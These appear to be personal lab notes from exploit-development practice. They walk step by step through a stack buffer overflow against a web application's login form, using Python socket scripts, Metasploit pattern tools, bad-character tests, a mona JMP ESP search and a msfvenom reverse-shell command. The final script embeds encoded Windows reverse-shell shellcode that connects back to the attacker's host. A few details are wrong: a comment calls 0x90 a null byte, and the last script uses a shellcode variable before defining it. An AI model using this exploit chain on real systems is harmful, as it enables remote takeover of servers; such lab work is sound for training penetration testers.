import socket
import time
buf="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"

payload="username="+buf+"&password=Pass"
buffer =""
buffer += "POST /login HTTP/1.1\r\n"
buffer += "Host: 192.168.162.130\r\n"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-US,en;q=0.5\r\n"
buffer += "Referer: http://10.11.0.22/login\r\n"
buffer += "Connection: close\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "Content-Length: "+str(len(payload))+"\r\n"
buffer += "\r\n"
buffer +=payload

print buffer

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.162.130",80))
s.send(buffer)
print s.recv(1024)
s.close()
 
#
#>>locate pattern_create
#/usr/bin/msf-pattern_create
#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb



#>>msf-pattern_create -l 800
#Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba


EIP 42306142


>>/usr/bin/msf-pattern_offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb


>>msf-pattern_offset -l 800 -q 42306142
[*] Exact match at offset 780




import socket
import time
buf="A"*780+'BBBB'+'c'*(800-780-4)

payload="username="+buf+"&password=Pass"
buffer =""
buffer += "POST /login HTTP/1.1\r\n"
buffer += "Host: 192.168.162.130\r\n"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-US,en;q=0.5\r\n"
buffer += "Referer: http://10.11.0.22/login\r\n"
buffer += "Connection: close\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "Content-Length: "+str(len(payload))+"\r\n"
buffer += "\r\n"
buffer +=payload

print buffer

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.162.130",80))
s.send(buffer)
print s.recv(1024)
s.close()




badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )



will try to exploit and in immunity debugger will click on ESP then follow in Dump and will check where is the chars were cut and write save the char and delete it from shell


import socket
#"\x00\x0a\x0d\x25\x26\x2b\3d"
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

buf="A"*780+'BBBB'+badchars+'c'*(1500-len(badchars)-780-4)
#1500 to check how the buffer will bear
payload="username="+buf+"&password=Pass"
buffer =""
buffer += "POST /login HTTP/1.1\r\n"
buffer += "Host: 192.168.162.130\r\n"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-US,en;q=0.5\r\n"
buffer += "Referer: http://10.11.0.22/login\r\n"
buffer += "Connection: close\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "Content-Length: "+str(len(payload))+"\r\n"
buffer += "\r\n"
buffer +=payload

print buffer

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.162.130",80))
s.send(buffer)
print s.recv(1024)
s.close()


!mona modules

To find the jump point

>>msf-nasm_shell
jmp esp  > FFE4


!mona find -s "\xff\xe4" -m "libspp.dll"

0x10090c83


import socket

#"\x00\x0a\x0d\x25\x26\x2b\3d"
#log data, item 3
#Address from mona = 0x10090c83 (jmp ESP point): "\xff\xe4"
# in memory (littel indian)= "\x83\x0c\x09\x10"


buf="A"*780+"\x83\x0c\x09\x10"+'c'*(1500-780-4)
#1500 to check how the buffer will bear
payload="username="+buf+"&password=Pass"
buffer =""
buffer += "POST /login HTTP/1.1\r\n"
buffer += "Host: 192.168.162.130\r\n"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-US,en;q=0.5\r\n"
buffer += "Referer: http://10.11.0.22/login\r\n"
buffer += "Connection: close\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "Content-Length: "+str(len(payload))+"\r\n"
buffer += "\r\n"
buffer +=payload

print buffer

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.162.130",80))
s.send(buffer)
print s.recv(1024)
s.close()


msfvenom -l payloads


sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.162.1 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"



import socket

#"\x00\x0a\x0d\x25\x26\x2b\3d"
#log data, item 3
#Address from mona = 0x10090c83 (jmp ESP point): "\xff\xe4"
# in memory (littel indian)= "\x83\x0c\x09\x10"

shell+=""
shell+="\xdb\xc5\xbd\x58\xf2\xbe\xc5\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
shell+="\x52\x31\x6f\x17\x03\x6f\x17\x83\x9f\xf6\x5c\x30\xe3\x1f\x22"
shell+="\xbb\x1b\xe0\x43\x35\xfe\xd1\x43\x21\x8b\x42\x74\x21\xd9\x6e"
shell+="\xff\x67\xc9\xe5\x8d\xaf\xfe\x4e\x3b\x96\x31\x4e\x10\xea\x50"
shell+="\xcc\x6b\x3f\xb2\xed\xa3\x32\xb3\x2a\xd9\xbf\xe1\xe3\x95\x12"
shell+="\x15\x87\xe0\xae\x9e\xdb\xe5\xb6\x43\xab\x04\x96\xd2\xa7\x5e"
shell+="\x38\xd5\x64\xeb\x71\xcd\x69\xd6\xc8\x66\x59\xac\xca\xae\x93"
shell+="\x4d\x60\x8f\x1b\xbc\x78\xc8\x9c\x5f\x0f\x20\xdf\xe2\x08\xf7"
shell+="\x9d\x38\x9c\xe3\x06\xca\x06\xcf\xb7\x1f\xd0\x84\xb4\xd4\x96"
shell+="\xc2\xd8\xeb\x7b\x79\xe4\x60\x7a\xad\x6c\x32\x59\x69\x34\xe0"
shell+="\xc0\x28\x90\x47\xfc\x2a\x7b\x37\x58\x21\x96\x2c\xd1\x68\xff"
shell+="\x81\xd8\x92\xff\x8d\x6b\xe1\xcd\x12\xc0\x6d\x7e\xda\xce\x6a"
shell+="\x81\xf1\xb7\xe4\x7c\xfa\xc7\x2d\xbb\xae\x97\x45\x6a\xcf\x73"
shell+="\x95\x93\x1a\xd3\xc5\x3b\xf5\x94\xb5\xfb\xa5\x7c\xdf\xf3\x9a"
shell+="\x9d\xe0\xd9\xb2\x34\x1b\x8a\x7c\x60\x81\x4b\x15\x73\xc5\x5a"
shell+="\xb9\xfa\x23\x36\x51\xab\xfc\xaf\xc8\xf6\x76\x51\x14\x2d\xf3"
shell+="\x51\x9e\xc2\x04\x1f\x57\xae\x16\xc8\x97\xe5\x44\x5f\xa7\xd3"
shell+="\xe0\x03\x3a\xb8\xf0\x4a\x27\x17\xa7\x1b\x99\x6e\x2d\xb6\x80"
shell+="\xd8\x53\x4b\x54\x22\xd7\x90\xa5\xad\xd6\x55\x91\x89\xc8\xa3"
shell+="\x1a\x96\xbc\x7b\x4d\x40\x6a\x3a\x27\x22\xc4\x94\x94\xec\x80"
shell+="\x61\xd7\x2e\xd6\x6d\x32\xd9\x36\xdf\xeb\x9c\x49\xd0\x7b\x29"
shell+="\x32\x0c\x1c\xd6\xe9\x94\x3c\x35\x3b\xe1\xd4\xe0\xae\x48\xb9"
shell+="\x12\x05\x8e\xc4\x90\xaf\x6f\x33\x88\xda\x6a\x7f\x0e\x37\x07"
shell+="\x10\xfb\x37\xb4\x11\x2e"

buf="A"*780+"\x83\x0c\x09\x10"+'\x90'*20+shell+'\x90'*(1500-22-len(shell))
#\x90 is null byte
#1500 to check how the buffer will bear
payload="username="+buf+"&password=Pass"
buffer =""
buffer += "POST /login HTTP/1.1\r\n"
buffer += "Host: 192.168.162.130\r\n"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-US,en;q=0.5\r\n"
buffer += "Referer: http://10.11.0.22/login\r\n"
buffer += "Connection: close\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "Content-Length: "+str(len(payload))+"\r\n"
buffer += "\r\n"
buffer +=payload

print buffer

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.162.130",80))
s.send(buffer)
print s.recv(1024)
s.close() 
